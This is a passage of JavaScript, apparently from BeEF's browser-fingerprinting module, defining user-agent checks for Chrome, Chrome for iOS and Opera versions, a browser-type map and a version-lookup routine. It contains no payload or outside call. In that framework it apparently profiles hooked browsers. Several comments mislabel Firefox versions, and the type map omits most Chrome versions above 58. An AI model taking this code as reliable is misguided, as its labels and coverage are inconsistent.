        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 81) ? true : false);
    },

    /**
     * Returns true if Chrome 82.
     * @example: beef.browser.isC82()
     */
    isC82: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 82) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 82.
     * @example: beef.browser.isC82iOS()
     */
    isC82iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 82) ? true : false);
    },

    /**
     * Returns true if Chrome 83.
     * @example: beef.browser.isC83()
     */
    isC83: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 83) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 83.
     * @example: beef.browser.isC83iOS()
     */
    isC83iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 83) ? true : false);
    },

    /**
     * Returns true if Chrome 84.
     * @example: beef.browser.isC84()
     */
    isC84: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 84) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 84.
     * @example: beef.browser.isC84iOS()
     */
    isC84iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 84) ? true : false);
    },

    /**
     * Returns true if Chrome 85.
     * @example: beef.browser.isC85()
     */
    isC85: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 85) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 85.
     * @example: beef.browser.isC85iOS()
     */
    isC85iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 85) ? true : false);
    },

    /**
     * Returns true if Chrome 86.
     * @example: beef.browser.isC86()
     */
    isC86: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 86) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 86.
     * @example: beef.browser.isC86iOS()
     */
    isC86iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 86) ? true : false);
    },

    /**
     * Returns true if Chrome 87.
     * @example: beef.browser.isC87()
     */
    isC87: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 87) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 87.
     * @example: beef.browser.isC87iOS()
     */
    isC87iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 87) ? true : false);
    },

    /**
     * Returns true if Chrome 88.
     * @example: beef.browser.isC88()
     */
    isC88: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 88) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 88.
     * @example: beef.browser.isC88iOS()
     */
    isC88iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 88) ? true : false);
    },

    /**
     * Returns true if Chrome 89.
     * @example: beef.browser.isC89()
     */
    isC89: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 89) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 89.
     * @example: beef.browser.isC89iOS()
     */
    isC89iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 89) ? true : false);
    },

    /**
     * Returns true if Chrome 90.
     * @example: beef.browser.isC90()
     */
    isC90: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 90) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 90.
     * @example: beef.browser.isC90iOS()
     */
    isC90iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 90) ? true : false);
    },

    /**
     * Returns true if Chrome 91.
     * @example: beef.browser.isC91()
     */
    isC91: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 91) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 91.
     * @example: beef.browser.isC91iOS()
     */
    isC91iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 91) ? true : false);
    },

    /**
     * Returns true if Chrome 92.
     * @example: beef.browser.isC92()
     */
    isC92: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 92) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 92.
     * @example: beef.browser.isC92iOS()
     */
    isC92iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 92) ? true : false);
    },

    /**
     * Returns true if Chrome 93.
     * @example: beef.browser.isC93()
     */
    isC93: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 93) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 93.
     * @example: beef.browser.isC93iOS()
     */
    isC93iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 93) ? true : false);
    },

    /**
     * Returns true if Chrome 94.
     * @example: beef.browser.isC94()
     */
    isC94: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 94) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 94.
     * @example: beef.browser.isC94iOS()
     */
    isC94iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 94) ? true : false);
    },

    /**
     * Returns true if Chrome 95.
     * @example: beef.browser.isC95()
     */
    isC95: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 95) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 95.
     * @example: beef.browser.isC95iOS()
     */
    isC95iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 95) ? true : false);
    },

    /**
     * Returns true if Chrome 96.
     * @example: beef.browser.isC96()
     */
    isC96: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 96) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 96.
     * @example: beef.browser.isC96iOS()
     */
    isC96iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 96) ? true : false);
    },

    /**
     * Returns true if Chrome 97.
     * @example: beef.browser.isC97()
     */
    isC97: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 97) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 97.
     * @example: beef.browser.isC97iOS()
     */
    isC97iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 97) ? true : false);
    },

    /**
     * Returns true if Chrome 98.
     * @example: beef.browser.isC98()
     */
    isC98: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 98) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 98.
     * @example: beef.browser.isC98iOS()
     */
    isC98iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 98) ? true : false);
    },

    /**
     * Returns true if Chrome 99.
     * @example: beef.browser.isC99()
     */
    isC99: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 99) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 99.
     * @example: beef.browser.isC99iOS()
     */
    isC99iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 99) ? true : false);
    },

    /**
     * Returns true for modern versions of Chrome (above 9).
     * @example: beef.browser.isCbowser()
     */
    isCbowser: function () {
        const parser = bowser.getParser(navigator.userAgent);
        const browserName = parser.getBrowserName();
        return browserName == 'Chrome';
    },    

    /**
     * Returns true if Chrome.
     * @example: beef.browser.isC()
     */
    isC: function () {
        var legacyCheck = this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12() || this.isC13() || this.isC14() || this.isC15() || this.isC16() || this.isC17() || this.isC18() || this.isC19() || this.isC19iOS() || this.isC20() || this.isC20iOS() || this.isC21() || this.isC21iOS() || this.isC22() || this.isC22iOS() || this.isC23() || this.isC23iOS() || this.isC24() || this.isC24iOS() || this.isC25() || this.isC25iOS() || this.isC26() || this.isC26iOS() || this.isC27() || this.isC27iOS() || this.isC28() || this.isC28iOS() || this.isC29() || this.isC29iOS() || this.isC30() || this.isC30iOS() || this.isC31() || this.isC31iOS() || this.isC32() || this.isC32iOS() || this.isC33() || this.isC33iOS() || this.isC34() || this.isC34iOS() || this.isC35() || this.isC35iOS() || this.isC36() || this.isC36iOS() || this.isC37() || this.isC37iOS() || this.isC38() || this.isC38iOS() || this.isC39() || this.isC39iOS() || this.isC40() || this.isC40iOS() || this.isC41() || this.isC41iOS() || this.isC42() || this.isC42iOS() || this.isC43() || this.isC43iOS() || this.isC44() || this.isC44iOS() || this.isC45() || this.isC45iOS() || this.isC46() || this.isC46iOS() || this.isC47() || this.isC47iOS() || this.isC48() || this.isC48iOS() || this.isC49() || this.isC49iOS() || this.isC50() || this.isC50iOS() || this.isC51() || this.isC51iOS() || this.isC52() || this.isC52iOS() || this.isC53() || this.isC53iOS() || this.isC54() || this.isC54iOS() || this.isC55() || this.isC55iOS() || this.isC56() || this.isC56iOS() || this.isC57() || this.isC57iOS() || this.isC58() || this.isC58iOS() || this.isC59() || this.isC59iOS()|| this.isC60() || this.isC60iOS()|| this.isC61() || this.isC61iOS()|| this.isC62() || this.isC62iOS()|| this.isC63() || this.isC63iOS()|| this.isC64() || this.isC64iOS()|| this.isC65() || this.isC65iOS()|| this.isC66() || this.isC66iOS()|| this.isC67() || this.isC67iOS()|| this.isC68() || this.isC68iOS()|| this.isC69() || this.isC69iOS()|| this.isC70() || this.isC70iOS()|| this.isC71() || this.isC71iOS()|| this.isC72() || this.isC72iOS()|| this.isC73() || this.isC73iOS()|| this.isC74() || this.isC74iOS()|| this.isC75() || this.isC75iOS()|| this.isC76() || this.isC76iOS()|| this.isC77() || this.isC77iOS()|| this.isC78() || this.isC78iOS()|| this.isC79() || this.isC79iOS()|| this.isC80() || this.isC80iOS()|| this.isC81() || this.isC81iOS()|| this.isC82() || this.isC82iOS()|| this.isC83() || this.isC83iOS()|| this.isC84() || this.isC84iOS()|| this.isC85() || this.isC85iOS()|| this.isC86() || this.isC86iOS()|| this.isC87() || this.isC87iOS()|| this.isC88() || this.isC88iOS()|| this.isC89() || this.isC89iOS()|| this.isC90() || this.isC90iOS()|| this.isC91() || this.isC91iOS()|| this.isC92() || this.isC92iOS()|| this.isC93() || this.isC93iOS()|| this.isC94() || this.isC94iOS()|| this.isC95() || this.isC95iOS()|| this.isC96() || this.isC96iOS()|| this.isC97() || this.isC97iOS()|| this.isC98() || this.isC98iOS()|| this.isC99() || this.isC99iOS();
        return legacyCheck || this.isCbowser();
    },

    /**
     * Returns true if Opera 9.50 through 9.52.
     * @example: beef.browser.isO9_52()
     */
    isO9_52: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.5/) != null));
    },

    /**
     * Returns true if Opera 9.60 through 9.64.
     * @example: beef.browser.isO9_60()
     */
    isO9_60: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.6/) != null));
    },

    /**
     * Returns true if Opera 10.xx.
     * @example: beef.browser.isO10()
     */
    isO10: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/10\./) != null));
    },

    /**
     * Returns true if Opera 11.xx.
     * @example: beef.browser.isO11()
     */
    isO11: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/11\./) != null));
    },

    /**
     * Returns true if Opera 12.xx.
     * @example: beef.browser.isO12()
     */
    isO12: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/12\./) != null));
    },

    /**
     * Returns true if the browser is any version of Opera.
     * @example: beef.browser.isObowser()
    */
    isObowser: function () {
        const parser = bowser.getParser(navigator.userAgent);
        const browserName = parser.getBrowserName();
        return browserName == 'Opera';
    },

    /**
     * Returns true if Opera.
     * @example: beef.browser.isO()
     */
    isO: function () {
        var legacyCheck = this.isO9_52() || this.isO9_60() || this.isO10() || this.isO11() || this.isO12();
        return legacyCheck || this.isObowser();
    },

    /**
     * Returns the type of browser being used.
     * @example: beef.browser.type().IE6
     * @example: beef.browser.type().FF
     * @example: beef.browser.type().O
     */
    type: function () {

        return {
            E: this.isEdge(), // Edge any version
            C5: this.isC5(), // Chrome 5
            C6: this.isC6(), // Chrome 6
            C7: this.isC7(), // Chrome 7
            C8: this.isC8(), // Chrome 8
            C9: this.isC9(), // Chrome 9
            C10: this.isC10(), // Chrome 10
            C11: this.isC11(), // Chrome 11
            C12: this.isC12(), // Chrome 12
            C13: this.isC13(), // Chrome 13
            C14: this.isC14(), // Chrome 14
            C15: this.isC15(), // Chrome 15
            C16: this.isC16(), // Chrome 16
            C17: this.isC17(), // Chrome 17
            C18: this.isC18(), // Chrome 18
            C19: this.isC19(), // Chrome 19
            C19iOS: this.isC19iOS(), // Chrome 19 on iOS
            C20: this.isC20(), // Chrome 20
            C20iOS: this.isC20iOS(), // Chrome 20 on iOS
            C21: this.isC21(), // Chrome 21
            C21iOS: this.isC21iOS(), // Chrome 21 on iOS
            C22: this.isC22(), // Chrome 22
            C22iOS: this.isC22iOS(), // Chrome 22 on iOS
            C23: this.isC23(), // Chrome 23
            C23iOS: this.isC23iOS(), // Chrome 23 on iOS
            C24: this.isC24(), // Chrome 24
            C24iOS: this.isC24iOS(), // Chrome 24 on iOS
            C25: this.isC25(), // Chrome 25
            C25iOS: this.isC25iOS(), // Chrome 25 on iOS
            C26: this.isC26(), // Chrome 26
            C26iOS: this.isC26iOS(), // Chrome 26 on iOS
            C27: this.isC27(), // Chrome 27
            C27iOS: this.isC27iOS(), // Chrome 27 on iOS
            C28: this.isC28(), // Chrome 28
            C28iOS: this.isC28iOS(), // Chrome 28 on iOS
            C29: this.isC29(), // Chrome 29
            C29iOS: this.isC29iOS(), // Chrome 29 on iOS
            C30: this.isC30(), // Chrome 30
            C30iOS: this.isC30iOS(), // Chrome 30 on iOS
            C31: this.isC31(), // Chrome 31
            C31iOS: this.isC31iOS(), // Chrome 31 on iOS
            C32: this.isC32(), // Chrome 32
            C32iOS: this.isC32iOS(), // Chrome 32 on iOS
            C33: this.isC33(), // Chrome 33
            C33iOS: this.isC33iOS(), // Chrome 33 on iOS
            C34: this.isC34(), // Chrome 34
            C34iOS: this.isC34iOS(), // Chrome 34 on iOS
            C35: this.isC35(), // Chrome 35
            C35iOS: this.isC35iOS(), // Chrome 35 on iOS
            C36: this.isC36(), // Chrome 36
            C36iOS: this.isC36iOS(), // Chrome 36 on iOS
            C37: this.isC37(), // Chrome 37
            C37iOS: this.isC37iOS(), // Chrome 37 on iOS
            C38: this.isC38(), // Chrome 38
            C38iOS: this.isC38iOS(), // Chrome 38 on iOS
            C39: this.isC39(), // Chrome 39
            C39iOS: this.isC39iOS(), // Chrome 39 on iOS
            C40: this.isC40(), // Chrome 40
            C40iOS: this.isC40iOS(), // Chrome 40 on iOS
            C41: this.isC41(), // Chrome 41
            C41iOS: this.isC41iOS(), // Chrome 41 on iOS
            C42: this.isC42(), // Chrome 42
            C42iOS: this.isC42iOS(), // Chrome 42 on iOS
            C43: this.isC43(), // Chrome 43
            C43iOS: this.isC43iOS(), // Chrome 43 on iOS
            C44: this.isC44(), // Chrome 44
            C44iOS: this.isC44iOS(), // Chrome 44 on iOS
            C45: this.isC45(), // Chrome 45
            C45iOS: this.isC45iOS(), // Chrome 45 on iOS
            C46: this.isC46(), // Chrome 46
            C46iOS: this.isC46iOS(), // Chrome 46 on iOS
            C47: this.isC47(), // Chrome 47
            C47iOS: this.isC47iOS(), // Chrome 47 on iOS
            C48: this.isC48(), // Chrome 48
            C48iOS: this.isC48iOS(), // Chrome 48 on iOS
            C49: this.isC49(), // Chrome 49
            C49iOS: this.isC49iOS(), // Chrome 49 on iOS
            C50: this.isC50(), // Chrome 50
            C50iOS: this.isC50iOS(), // Chrome 50 on iOS
            C51: this.isC51(), // Chrome 51
            C51iOS: this.isC51iOS(), // Chrome 51 on iOS
            C52: this.isC52(), // Chrome 52
            C52iOS: this.isC52iOS(), // Chrome 52 on iOS
            C53: this.isC53(), // Chrome 53
            C53iOS: this.isC53iOS(), // Chrome 53 on iOS
            C54: this.isC54(), // Chrome 54
            C54iOS: this.isC54iOS(), // Chrome 54 on iOS
            C55: this.isC55(), // Chrome 55
            C55iOS: this.isC55iOS(), // Chrome 55 on iOS
            C56: this.isC56(), // Chrome 56
            C56iOS: this.isC56iOS(), // Chrome 56 on iOS
            C57: this.isC57(), // Chrome 57
            C57iOS: this.isC57iOS(), // Chrome 57 on iOS
            C58: this.isC58(), // Chrome 58
            C58iOS: this.isC58iOS(), // Chrome 58 on iOS
            C63iOS: this.isC63iOS(),
            C: this.isC(), // Chrome any version

            FF2: this.isFF2(), // Firefox 2
            FF3: this.isFF3(), // Firefox 3
            FF3_5: this.isFF3_5(), // Firefox 3.5
            FF3_6: this.isFF3_6(), // Firefox 3.6
            FF4: this.isFF4(), // Firefox 4
            FF5: this.isFF5(), // Firefox 5
            FF6: this.isFF6(), // Firefox 6
            FF7: this.isFF7(), // Firefox 7
            FF8: this.isFF8(), // Firefox 8
            FF9: this.isFF9(), // Firefox 9
            FF10: this.isFF10(), // Firefox 10
            FF11: this.isFF11(), // Firefox 11
            FF12: this.isFF12(), // Firefox 12
            FF13: this.isFF13(), // Firefox 13
            FF14: this.isFF14(), // Firefox 14
            FF15: this.isFF15(), // Firefox 15
            FF16: this.isFF16(), // Firefox 16
            FF17: this.isFF17(), // Firefox 17
            FF18: this.isFF18(), // Firefox 18
            FF19: this.isFF19(), // Firefox 19
            FF20: this.isFF20(), // Firefox 20
            FF21: this.isFF21(), // Firefox 21
            FF22: this.isFF22(), // Firefox 22
            FF23: this.isFF23(), // Firefox 23
            FF24: this.isFF24(), // Firefox 24
            FF25: this.isFF25(), // Firefox 25
            FF26: this.isFF26(), // Firefox 26
            FF27: this.isFF27(), // Firefox 27
            FF28: this.isFF28(), // Firefox 28
            FF29: this.isFF29(), // Firefox 29
            FF30: this.isFF30(), // Firefox 30
            FF31: this.isFF31(), // Firefox 31
            FF32: this.isFF32(), // Firefox 32
            FF33: this.isFF33(), // Firefox 33
            FF34: this.isFF34(), // Firefox 34
            FF35: this.isFF35(), // Firefox 35
            FF36: this.isFF36(), // Firefox 36
            FF37: this.isFF37(), // Firefox 37
            FF38: this.isFF38(), // Firefox 38
            FF39: this.isFF39(), // Firefox 39
            FF40: this.isFF40(), // Firefox 40
            FF41: this.isFF41(), // Firefox 41
            FF42: this.isFF42(), // Firefox 42
            FF43: this.isFF43(), // Firefox 43
            FF44: this.isFF44(), // Firefox 44
            FF45: this.isFF45(), // Firefox 45
            FF46: this.isFF46(), // Firefox 46
            FF47: this.isFF47(), // Firefox 47
            FF48: this.isFF48(), // Firefox 48
            FF49: this.isFF49(), // Firefox 49
            FF50: this.isFF50(), // Firefox 50
            FF51: this.isFF51(), // Firefox 51
            FF52: this.isFF52(), // Firefox 52
            FF53: this.isFF53(), // Firefox 53
            FF54: this.isFF54(), // Firefox 54
            FF55: this.isFF55(), // Firefox 55
            FF56: this.isFF56(), // Firefox 56
            FF57: this.isFF57(), // Firefox 57
            FF58: this.isFF58(), // Firefox 58
            FF59: this.isFF59(), // Firefox 59
            FF60: this.isFF60(), // Firefox 60
            FF61: this.isFF61(), // Firefox 61
            FF62: this.isFF62(), // Firefox 62
            FF63: this.isFF63(), // Firefox 63
            FF64: this.isFF64(), // Firefox 64
            FF65: this.isFF65(), // Firefox 65
            FF66: this.isFF66(), // Firefox 66
            FF67: this.isFF67(), // Firefox 67
            FF68: this.isFF68(), // Firefox 68
            FF69: this.isFF69(), // Firefox 69
            FF70: this.isFF70(), // Firefox 70
            FF71: this.isFF71(), // Firefox 71
            FF72: this.isFF72(), // Firefox 72
            FF73: this.isFF73(), // Firefox 73
            FF74: this.isFF74(), // Firefox 74
            FF75: this.isFF75(), // Firefox 75
            FF76: this.isFF76(), // Firefox 76
            FF77: this.isFF77(), // Firefox 77
            FF78: this.isFF78(), // Firefox 78
            FF79: this.isFF79(), // Firefox 79
            FF80: this.isFF80(), // Firefox 70
            FF81: this.isFF81(), // Firefox 81
            FF82: this.isFF82(), // Firefox 82
            FF83: this.isFF83(), // Firefox 83
            FF84: this.isFF84(), // Firefox 85
            FF85: this.isFF85(), // Firefox 85
            FF86: this.isFF86(), // Firefox 85
            FF87: this.isFF87(), // Firefox 87
            FF88: this.isFF88(), // Firefox 85
            FF89: this.isFF89(), // Firefox 85
            FF90: this.isFF90(), // Firefox 80
            FF91: this.isFF91(), // Firefox 95
            FF92: this.isFF92(), // Firefox 92
            FF93: this.isFF93(), // Firefox 95
            FF94: this.isFF94(), // Firefox 94
            FF95: this.isFF95(), // Firefox 95
            FF96: this.isFF96(), // Firefox 96
            FF97: this.isFF97(), // Firefox 97
            FF98: this.isFF98(), // Firefox 98
            FF99: this.isFF99(), // Firefox 99

            FF: this.isFF(),   // Firefox any version

            IE6: this.isIE6(), // Internet Explorer 6
            IE7: this.isIE7(), // Internet Explorer 7
            IE8: this.isIE8(), // Internet Explorer 8
            IE9: this.isIE9(), // Internet Explorer 9
            IE10: this.isIE10(), // Internet Explorer 10
            IE11: this.isIE11(), // Internet Explorer 11
            IE: this.isIE(), // Internet Explorer any version

            O9_52: this.isO9_52(), // Opera 9.50 through 9.52
            O9_60: this.isO9_60(), // Opera 9.60 through 9.64
            O10: this.isO10(), // Opera 10.xx
            O11: this.isO11(), // Opera 11.xx
            O12: this.isO12(), // Opera 12.xx
            O: this.isO(),   // Opera any version

            EP: this.isEpi(), // Epiphany any version

            S4: this.isS4(), // Safari 4.xx
            S5: this.isS5(), // Safari 5.xx
            S6: this.isS6(), // Safari 6.x
            S7: this.isS7(), // Safari 7.x
            S8: this.isS8(), // Safari 8.x
            S: this.isS()   // Safari any version
        }
    },

    /**
     * Returns the major version of the browser being used.
     * @return: {String} version number || 'UNKNOWN'.
     *
     * @example: beef.browser.getBrowserVersion()
     */
    getBrowserVersion: function () {
        if (this.isEdge()) {
          try {
            return platform.version;
          } catch(e) {
            return 'unknown';
          }
        }
        ;   // Microsoft Edge

        if (this.isC5()) {
            return '5'
        }
        ;   // Chrome 5
        if (this.isC6()) {
            return '6'
        }
        ;   // Chrome 6
        if (this.isC7()) {
            return '7'
        }
        ;   // Chrome 7
        if (this.isC8()) {
            return '8'
        }
        ;   // Chrome 8
        if (this.isC9()) {
            return '9'
        }
        ;   // Chrome 9
        if (this.isC10()) {
            return '10'
        }
        ;   // Chrome 10
        if (this.isC11()) {
            return '11'
        }
        ;   // Chrome 11
        if (this.isC12()) {
            return '12'
        }
        ;   // Chrome 12
        if (this.isC13()) {
            return '13'
        }
        ;   // Chrome 13
        if (this.isC14()) {
            return '14'
        }
        ;   // Chrome 14
        if (this.isC15()) {
            return '15'
        }
        ;   // Chrome 15
        if (this.isC16()) {
            return '16'
        }
        ;	// Chrome 16
        if (this.isC17()) {
            return '17'
        }
        ;	// Chrome 17
        if (this.isC18()) {
            return '18'
        }
        ;	// Chrome 18
        if (this.isC19()) {
            return '19'
        }
        ;	// Chrome 19
        if (this.isC19iOS()) {
            return '19'
        }
        ;   // Chrome 19 for iOS
        if (this.isC20()) {
            return '20'
        }
        ;	// Chrome 20
        if (this.isC20iOS()) {
            return '20'
        }
        ;   // Chrome 20 for iOS
        if (this.isC21()) {
            return '21'
        }
        ;	// Chrome 21
        if (this.isC21iOS()) {
            return '21'
        }
        ;   // Chrome 21 for iOS
        if (this.isC22()) {
            return '22'
        }
        ;    // Chrome 22
        if (this.isC22iOS()) {
            return '22'
        }
        ;   // Chrome 22 for iOS
        if (this.isC23()) {
            return '23'
        }
        ;    // Chrome 23
        if (this.isC23iOS()) {
            return '23'
        }
        ;   // Chrome 23 for iOS
        if (this.isC24()) {
            return '24'
        }
        ;    // Chrome 24
        if (this.isC24iOS()) {
            return '24'
        }
        ;   // Chrome 24 for iOS
        if (this.isC25()) {
            return '25'
        }
        ;    // Chrome 25
        if (this.isC25iOS()) {
            return '25'
        }
        ;   // Chrome 25 for iOS
        if (this.isC26()) {
            return '26'
        }
        ;    // Chrome 26
        if (this.isC26iOS()) {
            return '26'
        }
        ;   // Chrome 26 for iOS
        if (this.isC27()) {
            return '27'
        }
        ;    // Chrome 27
        if (this.isC27iOS()) {
            return '27'
        }
        ;   // Chrome 27 for iOS
        if (this.isC28()) {
            return '28'
        }
        ;    // Chrome 28
        if (this.isC28iOS()) {
            return '28'
        }
        ;   // Chrome 28 for iOS
        if (this.isC29()) {
            return '29'
        }
        ;    // Chrome 29
        if (this.isC29iOS()) {
            return '29'
        }
        ;   // Chrome 29 for iOS
        if (this.isC30()) {
            return '30'
        }
        ;    // Chrome 30
        if (this.isC30iOS()) {
            return '30'
        }
        ;   // Chrome 30 for iOS
        if (this.isC31()) {
            return '31'
        }
        ;   // Chrome 31
        if (this.isC31iOS()) {
            return '31'
        }
        ;   // Chrome 31 for iOS
        if (this.isC32()) {
            return '32'
        }
        ;   // Chrome 32
        if (this.isC32iOS()) {
            return '32'
        }
        ;   // Chrome 32 for iOS
        if (this.isC33()) {
            return '33'
        }
        ;   // Chrome 33
        if (this.isC33iOS()) {
            return '33'
        }
        ;   // Chrome 33 for iOS
        if (this.isC34()) {
            return '34'
        }
        ;   // Chrome 34
        if (this.isC34iOS()) {
